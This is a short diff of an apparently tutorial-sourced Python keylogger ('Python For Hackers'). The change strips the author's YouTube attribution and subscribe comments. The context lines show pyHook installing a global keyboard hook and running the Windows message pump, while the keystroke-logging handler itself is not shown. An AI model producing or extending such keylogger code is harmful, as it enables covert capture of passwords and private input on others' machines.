@@ -1,7 +1,3 @@
-#python For Hackers - Priyank Gada
-# www.youtube.com/priyankgada
-# Requires PyHook and PyWin32 Modules .
-
 import pyHook
 import pythoncom
 import sys
@@ -16,6 +12,3 @@ hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown =  OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
-
-#Subscribe - www.youtube.com/priyankgada
-#video tutorial / Testing on my youtube channel.
